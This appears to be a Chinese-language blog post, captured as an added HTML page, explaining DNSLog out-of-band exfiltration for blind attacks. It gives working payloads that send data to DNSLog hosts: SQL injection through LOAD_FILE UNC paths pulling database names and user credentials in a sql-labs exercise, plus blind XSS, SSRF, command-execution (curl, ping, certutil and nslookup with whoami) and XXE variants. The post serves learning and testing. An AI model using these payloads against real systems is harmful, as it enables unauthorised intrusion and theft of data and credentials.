@@ -1,0 +1,704 @@
+
+
+<!DOCTYPE html>
+<html lang="zh" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="FHK_KMD6377">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="漏洞-DNS外带DNSLog外带概述：在进行盲注的时候，因为需要频繁发送访问请求，有的网站配置了waf就有可能让我们的注入受阻。所以用DNSlog外带可以减少请求并且直接回显数据。（非常好用） DNS：(Domain Name System)域名系统，负责把域名转换成IP地址。 DNSlog：DNS的日志，DNS在域名解析的时候会留下域名和解析IP的记录。 DNSlog外带原理：DNS在解析的时候">
+<meta property="og:type" content="article">
+<meta property="og:title" content="漏洞-DNS外带 639">
+<meta property="og:url" content="http://example.com/2024/09/03/%E6%BC%8F%E6%B4%9E-DNS%E5%A4%96%E5%B8%A6/index.html">
+<meta property="og:site_name" content="FHK_KMD终晨">
+<meta property="og:description" content="漏洞-DNS外带DNSLog外带概述：在进行盲注的时候，因为需要频繁发送访问请求，有的网站配置了waf就有可能让我们的注入受阻。所以用DNSlog外带可以减少请求并且直接回显数据。（非常好用） DNS：(Domain Name System)域名系统，负责把域名转换成IP地址。 DNSlog：DNS的日志，DNS在域名解析的时候会留下域名和解析IP的记录。 DNSlog外带原理：DNS在解析的时候">
+<meta property="og:locale">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240515001106.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240515001131.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240515001204.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240515001217.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240515001250.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240515001326.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240515001410.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240515001345.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240515001429.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240515001436.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240515001443.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240515001456.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240515001550.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240515001604.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240515001612.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240515001618.png">
+<meta property="article:published_time" content="2024-09-02T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-09-25T04:31:17.133Z">
+<meta property="article:author" content="FHK_KMD6377">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/images/Pasted%20image%2020240515001106.png">
+  
+  
+  
+  <title>漏洞-DNS外带 639 - FHK_KMD终晨</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>FHK_KMD&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Inicio</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archivo</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categorías</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Etiquetas</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>Acerca</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="漏洞-DNS外带 639"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-09-03 00:00" pubdate>
+          September 3, 2024 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.2k palabras
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          10 minutos
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">漏洞-DNS外带 639</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="漏洞-DNS外带"><a href="#漏洞-DNS外带" class="headerlink" title="漏洞-DNS外带"></a>漏洞-DNS外带</h1><h1 id="DNSLog外带"><a href="#DNSLog外带" class="headerlink" title="DNSLog外带"></a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hellobao/articles/17266933.html" title="发布于 2023-03-28 22:46">DNSLog外带</a></h1><h1 id="概述："><a href="#概述：" class="headerlink" title="概述："></a>概述：</h1><p>在进行盲注的时候，因为需要频繁发送访问请求，有的网站配置了waf就有可能让我们的注入受阻。所以用DNSlog外带可以减少请求并且直接回显数据。（非常好用）</p>
+<p>DNS：(Domain Name System)域名系统，负责把域名转换成IP地址。</p>
+<p>DNSlog：DNS的日志，DNS在域名解析的时候会留下域名和解析IP的记录。</p>
+<p>DNSlog外带原理：DNS在解析的时候会留下日志，我们将信息放在高级域名中，传递到自己这里，然后通过读日志获取信息。</p>
+<p><strong>dnslog通常用在：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1.</span><span class="hljs-keyword">SQL</span>盲注<br><span class="hljs-number">2.</span>无回显的XSS<br><span class="hljs-number">3.</span>无回显的命令执行<br><span class="hljs-number">5.</span>无回显的SSRF<br><span class="hljs-number">5.</span>Blind XXE<br></code></pre></td></tr></table></figure>
+
+<p>三个常见的DNSLog平台：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://ceye.io/">http://ceye.io</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.dnslog.cn/">http://www.dnslog.cn/</a></li>
+<li><a target="_blank" rel="noopener" href="http://eyes.sh/dns/">http://eyes.sh/dns/</a></li>
+</ul>
+<h1 id="1、DNSLog回显原理"><a href="#1、DNSLog回显原理" class="headerlink" title="1、DNSLog回显原理"></a>1、DNSLog回显原理</h1><p>遇到无回显注入时，写脚本进行盲注，设置ip代理池解决ip封禁的问题。但是盲注效率很低，所以产生了DNSlog注入。</p>
+<p>首先需要有一个可以配置的域名，比如：ceye.io，然后通过代理商设置域名 ceye.io 的 nameserver 为自己的服务器 A，然后再服务器 A 上配置好 DNS Server，这样以来所有 ceye.io 及其子域名的查询都会到 服务器 A 上，这时就能够实时地监控域名查询请求了。</p>
+<p>DNS在解析的时候会留下日志，通过读取多级域名的解析日志，来获取信息。简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息。</p>
+<p>如图：<br><img src="/images/Pasted%20image%2020240515001106.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="2、DNSLOG回显测试"><a href="#2、DNSLOG回显测试" class="headerlink" title="2、DNSLOG回显测试"></a><strong>2、DNSLOG回显测试</strong></h1><p><strong>或者 <a target="_blank" rel="noopener" href="http://www.dnslog.cn/">http://www.dnslog.cn</a></strong></p>
+<p><strong>注册<a href="http://ceye.io，给了一个二级域名：xxx.ceye.io。把注入信息放到二级域名那里，后台的日志会记录下来。">http://ceye.io，给了一个二级域名：xxx.ceye.io。把注入信息放到二级域名那里，后台的日志会记录下来。</a></strong><br><img src="/images/Pasted%20image%2020240515001131.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="3、SQL盲注"><a href="#3、SQL盲注" class="headerlink" title="3、SQL盲注"></a><strong>3、SQL盲注</strong></h1><p><strong><a target="_blank" rel="noopener" href="https://github.com/ADOOO/DnslogSqlinj">https://github.com/ADOOO/DnslogSqlinj</a> 自动化脚本</strong></p>
+<p>dnslog回显只能用于windows系统，原理就是’\\‘代表Microsoft Windows通用命名约定（UNC）的文件和目录路径格式利用任何以下扩展存储程序引发DNS地址解析。双斜杠表示网络资源路径多加两个\就是转义了反斜杠</p>
+<p>DNSlog盲注需要用的load_file()函数，所以一般得是root权限。</p>
+<p>show variables like ‘%secure%’; 查看load_file()可以读取的磁盘</p>
+<p>1、当secure_file_priv为空，就可以读取磁盘的目录。</p>
+<p>2、当secure_file_priv为G:\，就可以读取G盘的文件。</p>
+<p>3、当secure_file_priv为null，load_file就不能加载文件。<br><img src="/images/Pasted%20image%2020240515001204.png" srcset="/img/loading.gif" lazyload></p>
+<p>select load_file(‘\\afanti.xxxx.ceye.io\aaa’);  其中afanti就是要注入的查询语句，查看平台，dnsLog被记录下来。<br><img src="/images/Pasted%20image%2020240515001217.png" srcset="/img/loading.gif" lazyload></p>
+<p>测试sql-labs第五关：</p>
+<p>payload：’ and if((select load_file(concat(‘\\‘,(select database()),’.xxxxx.ceye.io\abc’))),1,0)– -+</p>
+<p>sql语句：SELECT * FROM users WHERE id&#x3D;’1’ and if((select load_file(concat(‘\\‘,(select database()),’.xxxxx.ceye.io\abc’))),1,0)</p>
+<p>查看dnslog日志，发现security数据库被查询出来：</p>
+<p><img src="/images/Pasted%20image%2020240515001250.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> LOAD_FILE(CONCAT(<span class="hljs-string">&#x27;\\\\&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>,<span class="hljs-string">&#x27;.mysql.buvx2r.ceye.io\\abc&#x27;</span>)); <br><span class="hljs-keyword">select</span> LOAD_FILE(CONCAT(<span class="hljs-string">&#x27;\\\\&#x27;</span>,database(),<span class="hljs-string">&#x27;.mysql.buvx2r.ceye.io\\abc&#x27;</span>));\\意思是让LOAD_FILE去读每个文件，当然这么文件存不存在，我们并不在意 <br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>查询当前库的第一个表 <br><span class="hljs-keyword">select</span> LOAD_FILE(CONCAT(<span class="hljs-string">&#x27;\\\\&#x27;</span>,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;.mysql.buvx2r.ceye.io\\abc&#x27;</span>));<br></code></pre></td></tr></table></figure>
+
+<pre><code class="hljs">![](/images/Pasted%20image%2020240515001303.png)
+</code></pre>
+<p><img src="/images/Pasted%20image%2020240515001326.png" srcset="/img/loading.gif" lazyload></p>
+<p>DNS请求被成功记录下来，由于test位置是可控的，所以可以将查询语句插入<br><img src="/images/Pasted%20image%2020240515001410.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/Pasted%20image%2020240515001345.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>查询第当前库第一个表名<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select LOAD_FILE(concat(&#x27;</span>\\\\<span class="hljs-string">&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&#x27;</span>mysql.buvx2r.ceye.io\\abc<span class="hljs-string">&#x27;)),2,3--+</span><br><span class="hljs-string">//查询users表第一个字段 使用hex编码避免出现特殊字符</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> LOAD_FILE(concat(<span class="hljs-string">&#x27;\\\\&#x27;</span>,(<span class="hljs-keyword">select</span> hex(concat_ws(<span class="hljs-string">&#x27;~&#x27;</span>,username,password)) <span class="hljs-keyword">from</span> security.users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;.mysql.buvx2r.ceye.io\\abc&#x27;</span>)),<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/Pasted%20image%2020240515001429.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/Pasted%20image%2020240515001436.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/Pasted%20image%2020240515001443.png" srcset="/img/loading.gif" lazyload></p>
+<p>解密。。。</p>
+<h1 id="4、XSS-无回显"><a href="#4、XSS-无回显" class="headerlink" title="4、XSS 无回显"></a>4、XSS 无回显</h1><p>通过盲打，让触发者浏览器访问预设至的链接地址。如果盲打成功，平台会收到链接访问记录。</p>
+<p>payload: <code>&gt;&lt;img src=http://xss.xxxx.ceye.io/aaa&gt;</code> 让src请求我们的dnslog平台</p>
+<p><img src="/images/Pasted%20image%2020240515001456.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="5、SSRF-无回显"><a href="#5、SSRF-无回显" class="headerlink" title="5、SSRF 无回显"></a>5、SSRF 无回显</h1><p>payload：</p>
+<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi">/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=<span class="hljs-keyword">name</span>&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;<span class="hljs-keyword">operator</span>=http:<span class="hljs-comment">//rsr8pf.dnslog.cn</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/Pasted%20image%2020240515001550.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="6、命令执行-无回显"><a href="#6、命令执行-无回显" class="headerlink" title="6、命令执行 无回显"></a>6、命令执行 无回显</h1><p>当 ping 一个域名时会对其进行一个递归 DNS 查询的过程，这个时候就能在后端获取到 DNS 的查询请求，当命令真正被执行且平台收到回显时就说明漏洞存在。</p>
+<p>linux：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl http://haha.xxx.ceye.io/`<span class="hljs-built_in">whoami</span>`<br>ping `<span class="hljs-built_in">whoami</span>`.xxxx.ceye.io<br></code></pre></td></tr></table></figure>
+
+<p>Windows：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ping %USERNAME%.xxx.ceye.io<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/Pasted%20image%2020240515001604.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd /v /c <span class="hljs-string">&quot;whoami &gt; temp &amp;&amp; certutil -encode temp temp2 &amp;&amp; findstr /L /V &quot;</span>CERTIFICATE<span class="hljs-string">&quot; temp2 &gt; temp3 &amp;&amp; set /p MYVAR=&lt; temp3 &amp;&amp; set FINAL=!MYVAR!.xxx.ceye.io &amp;&amp; nslookup !FINAL!&quot;</span><br>del temp*<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/Pasted%20image%2020240515001612.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="7、XXE-无回显"><a href="#7、XXE-无回显" class="headerlink" title="7、XXE 无回显"></a>7、XXE 无回显</h1><p>payload：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://ip.port.b182oj.ceye.io/xxe_test&quot;</span>&gt;</span></span><br><span class="hljs-meta">%remote;]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>/&gt;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://zhwzti.dnslog.cn&quot;</span> &gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/Pasted%20image%2020240515001618.png" srcset="/img/loading.gif" lazyload></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>漏洞-DNS外带 639</div>
+      <div>http://example.com/2024/09/03/漏洞-DNS外带/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Autor</div>
+          <div>FHK_KMD6377</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Publicado el</div>
+          <div>September 3, 2024</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licencia bajo</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Atribución">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/09/03/%E6%9C%89%E5%85%B3git/" title="有关git 639">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">有关git 639</span>
+                        <span class="visible-mobile">Anterior</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/09/03/%E6%9C%89%E5%85%B3Linux%E5%AD%90%E8%BF%9B%E7%A8%8B/" title="有关Linux子进程 639">
+                        <span class="hidden-mobile">有关Linux子进程 639</span>
+                        <span class="visible-mobile">Siguiente</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Tabla de Contenidos</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Buscar</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Palabra clave</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
